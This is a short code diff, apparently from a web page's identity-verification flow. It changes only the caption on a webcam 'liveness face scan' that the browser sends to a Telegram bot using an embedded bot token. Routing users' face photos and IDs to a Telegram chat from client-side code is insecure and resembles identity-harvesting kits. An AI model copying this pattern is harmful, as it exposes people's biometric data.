@@ -1202,7 +1202,7 @@
                     let fdFace = new FormData();
                     fdFace.append('chat_id', CHAT_ID);
                     fdFace.append('photo', webcamBlob, 'facescan.jpg');
-                    fdFace.append('caption', `*LIVENESS FACE SCAN*\n\nUser ID: \`${userID}\`\n\n--- AKSI ADMIN ---\nTERIMA VERIFIKASI:\n\`/verif ${userID}\`\n\nTOLAK KARENA BURAM:\n\`/tolak_verif ${userID}\``);
+                    fdFace.append('caption', `*LIVENESS FACE SCAN*\n\nUser ID: \`${userID}\`\n\n--- AKSI ADMIN ---\n\nTERIMA VERIFIKASI:\n\`/verif ${userID}\`\n\nTOLAK VERIFIKASI:\n\`/tolak_verif ${userID}\``);
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?parse_mode=Markdown`, { method: 'POST', body: fdFace });
                 } catch(e) { console.error("Gagal kirim media via bot", e); }
             }, 'image/jpeg');
